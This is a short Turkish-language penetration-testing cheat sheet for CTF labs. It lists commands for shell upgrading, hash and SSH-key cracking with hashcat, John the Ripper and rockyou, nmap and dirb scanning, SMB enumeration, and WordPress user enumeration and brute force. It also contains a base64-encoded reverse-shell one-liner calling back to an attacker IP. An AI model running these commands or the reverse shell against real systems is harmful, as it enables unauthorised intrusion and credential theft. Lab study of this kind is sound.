# Pentest El-Kitabı

# SH to Bash #
/bin/bash -i yada python3 -c 'import pty; pty.spawn("/bin/bash")'

# Hashcat Kullanım Örneği #
-m ---> Hash türünü belirtmek için kullanılır.
0 ---> Kütüphanede ki hash'in sayısı
" " ---> İki tırnak arası Hash'in geleceği yer.
/usr/share/wordlists/rockyou.txt ---> Hangi wordlist'i kullanacaksanız onu yazacağınız yer.
--force ---> Uyarıları geçer.

hashcat -m 0 "UWFwdyBFZWtjbCAtIFB2ciBSTUtQLi4uWFpXIFZXVVIuLi4gVFRJIFhFRi4uLiBMQUEgWlJHUVJPISEhIQpTZncuIEtham5tYiB4c2kgb3d1b3dnZQpGYXouIFRtbCBma2ZyIHFnc2VpayBhZyBvcWVpYngKRWxqd3guIFhpbCBicWkgYWlrbGJ5d3FlClJzZnYuIFp3ZWwgdnZtIGltZWwgc3VtZWJ0IGxxd2RzZmsKWWVqci4gVHFlbmwgVnN3IHN2bnQgInVycXNqZXRwd2JuIGVpbnlqYW11IiB3Zi4KCkl6IGdsd3cgQSB5a2Z0ZWYuLi4uIFFqaHN2Ym91dW9leGNtdndrd3dhdGZsbHh1Z2hoYmJjbXlkaXp3bGtic2lkaXVzY3ds" /usr/share/wordlists/rockyou.txt --force

# GCC Compile #
-o ---> dosyanın çıktısının ismi.

gcc -o örnek.c/py/rb

# Python ile PC servis etme #
python3 -m http.server

# CTF'ler için basic NMAP komutu #
nmap -sV -sC -A -T4 <ip.adress>

# Dirb Örnek Basic Kullanım #
dirb http://<ip.adress> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# JohnTheRipper Örnek Kullanımlar #
john -format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt /root/Desktop/spider.txt ---> Hash formatını biliyorsanız -format=<buraya yazınız>

john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

zip2john backup.zip > backup.hash ---> Zip şifrelerini hashlemek ve ardından kırmak için. ---> Kırmak istediğiniz zip > " hash çıktısının dosya adı "

ssh2john id_rsa > aa.txt ---> id_rsa'leri kırmak için.

# SMB'ye bakmak için #
smbclient -L <ip.adress> ---> Full enum
smbclient //<ip.adress>/<Bakmak istediğiniz dosyanın ismi>

# SCP kullanımı #
scp /root/37292.c <Kullanıcının ismi>@<ip.adress>:/tmp ---> Karşı tarafa ssh ile dosya aktarımı

# ECHO kullanımları #
echo -n "<Rot13-HasH>" | tr 'A-Za-z' 'N-ZA-Mn-za-m' ---> ROT13 hash decode
echo -n "Base64-Hash" | base64 -d ---> Base64 Hash decode
echo -n "Base64 Hash'e çevirmek istediğiniz kod. Örnek = (echo -n "bash -i >& /dev/tcp/10.8.50.72/4444 0>&1" | base64) " | base64
echo "<Yazmak istediğiniz şey >" > < İçine yazmak istediğiniz dosya/doküman>
echo 1 > /proc/sys/net/ipv4/ip_forward ---> IP forward

# WPSCAN Kulanımı #
wpscan --url < URL > -e vp,u ---> '-e' = Enum || vp ---> Vulnerable plugins || u ---> Users
wpscan --url < URL > --username elyana --password /usr/share/wordlists/rockyou.txt ---> Wordpress bruteforce saldırı. Manuel.
wpscan --url jack.thm -e u -P /usr/share/wordlists/rockyou.txt ---> Wordpress bruteforce saldırı. Otomatik.


 

